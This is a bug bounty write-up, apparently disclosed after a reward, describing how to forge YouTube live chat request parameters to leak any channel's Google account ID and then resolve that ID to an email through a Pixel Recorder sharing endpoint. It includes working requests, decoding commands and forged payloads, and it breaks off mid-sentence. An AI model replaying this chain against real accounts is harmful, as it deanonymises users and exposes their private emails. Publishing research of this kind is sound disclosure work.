---
title: Leaking the email of any YouTube user for $10,000
url: https://brutecat.com/articles/leaking-youtube-emails
source: Over Security - Cybersecurity news aggregator
date: 2025-07-02
fetch_date: 2025-10-06T23:55:59.942396
---

# Leaking the email of any YouTube user for $10,000

[< Back](/)

[< Back](/)

## Leaking the email of any YouTube user for $10,000

2025-02-12

![](/assets/youtube-email-disclosure.png)

Some time ago, I was looking for a research target in Google and was digging through the [Internal People API (Staging)](https://staging-people-pa.sandbox.googleapis.com/%24discovery/rest?key=AIzaSyBOh-LSTdP2ddSgqPk6ceLEKTb8viTIvdw) discovery document until I noticed something interesting:

```
   "BlockedTarget": {
      "id": "BlockedTarget",
      "description": "The target of a user-to-user block, used to specify creation/deletion of blocks.",
      "type": "object",
      "properties": {
        "profileId": {
          "description": "Required. The obfuscated Gaia ID of the user targeted by the block.",
          "type": "string"
        },
        "fallbackName": {
          "description": "Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.",
          "type": "string"
        }
      }
    },
```

It seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.
‎

That seemed perfectly fine until I remembered [this support page](https://support.google.com/accounts/answer/6388749#zippy=%2Cuse-youtube-to-block-an-account):
‎

![](/assets/leaking-youtube-emails/use_youtube_to_block.png)

‎

So, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in <https://myaccount.google.com/blocklist>
‎

![](/assets/leaking-youtube-emails/blocked_user.png)

The fallback name was set as their channel name **Mega Prime** and the profile ID was their obfuscated Gaia ID **107183641464576740691**
‎

This was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there's been several bugs to [resolve these to an email address](https://sector035.nl/articles/2022-35), so I was confident there was still a Gaia ID to Email in some old obscure Google product.

### Escalating this to 4 billion YouTube channels

So, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:
‎

![](/assets/leaking-youtube-emails/context_menu.png)
‎

**Request**

```
POST /youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&pbj=1&prettyPrint=false HTTP/2
Host: www.youtube.com
Cookie: <redacted>
```

**Response**

```
HTTP/2 200 OK
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  ...
  "serviceEndpoint": {
    ...
    "commandMetadata": {
      "webCommandMetadata": {
        "sendPost": true,
        "apiUrl": "/youtubei/v1/live_chat/moderate"
      }
    },
    "moderateLiveChatEndpoint": {
      "params": "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q="
    }
  }
  ...
}
```

That `params` is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.
‎

If we try decoding that `moderateLiveChatEndpoint` params:

```
$ echo -n "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=" | base64
 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
1 {
  5 {
    1: "UChs0pSaEoNLV4mevBFGaoKA"
    2: "36YnV9STBqc"
  }
}
10: 0
11: 1
12 {
  1: "113907466537670370590"
  2: "SE-aYOb-uCg059qHRis_ow"
}
14: 0
```

It actually just contains the Gaia ID of the user we want to block, we don't even need to block them!

Let's check out the `get_item_context_menu` requests params too:

```
$ echo -n "R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
3 {
  5 {
    1: "UChs0pSaEoNLV4mevBFGaoKA"
    2: "36YnV9STBqc"
  }
}
6 {
  1: "UCSE-aYOb-uCg059qHRis_ow"
}
```

Seems to just contain the channel ID of the channel we're blocking, the livestream video ID and livestream author ID. Let's try to fake the request params with our own target's channel ID.
‎

For this test, we'll use a [Topic Channel](https://www.youtube.com/channel/UCD2LZAT1j1DyVXq2R2BdusQ) since they are [auto-generated by YouTube](https://support.google.com/youtube/answer/7636475#topicchannels) and guaranteed to not have any live chat messages.

```
$ echo -n "<SNIP>" | base64 -d | sed 's/%3D/=/g' | base64 -d | sed 's/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g' | base64 | base64
R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=
```

‎

Testing this on `/youtubei/v1/live_chat/get_item_context_menu`:

```
...
"moderateLiveChatEndpoint":{"params":"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q="}
...
```

```
echo -n "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
1 {
  5 {
    1: "UChs0pSaEoNLV4mevBFGaoKA"
    2: "36YnV9STBqc"
  }
}
10: 0
11: 1
12 {
  1: "103261974221829892167"
  2: "D2LZAT1j1DyVXq2R2BdusQ"
}
14: 0
```

We can leak the Gaia ID of the channel - **103261974221829892167**

### The missing puzzle piece: Pixel Recorder

I told my friend [nathan](https://schizo.org) about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. [Pixel Recorder](https://recorder.google.com) was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at <https://recorder.google.com>:
‎

![](/assets/leaking-youtube-emails/recorder_home_page.png)

When we tried sharing the recording to a test email, that's when it hit us:

**Request**

```
POST /$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList HTTP/2
Host: pixelrecorder-pa.clients6.google.com
Cookie: <redacted>
Content-Length: 80
Authorization: <redacted>
X-Goog-Api-Key: AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro
Content-Type: application/json+protobuf
Referer: https://recorder.google.com/

["7adab89e-4ace-4945-9f75-6fe250ccbe49",null,[["113769094563819690011",2,null]]]
```

**Response**

```
HTTP/2 200 OK
Content-Type: application/json+protobuf; charset=UTF-8
Server: ESF
Content-Length: 138

["28bc3792-9bdb-4aed-9a78-17b0954abc7d",[[null,2,"[email protected]"]]]
```

This endpoint was taking in the obfuscated Gaia ID and... **returning the email?**
‎

We tested this with the obfuscated Gaia ID `107183641464576740691` we got from blocking that user on YouTube a while back and **it worked**:

```
HTTP/2 200 OK
Content-Type: application/json+protobuf; charset=UTF-8
Server: ESF
Content-Length: 138

["28bc3792-9bdb-4aed-9a78-17b0954abc7d",[[null,2,"[email protected]"],[null,2,"[email protected]"]]]
```

### A small problem: preventing notification to the target

It seems that whenever ...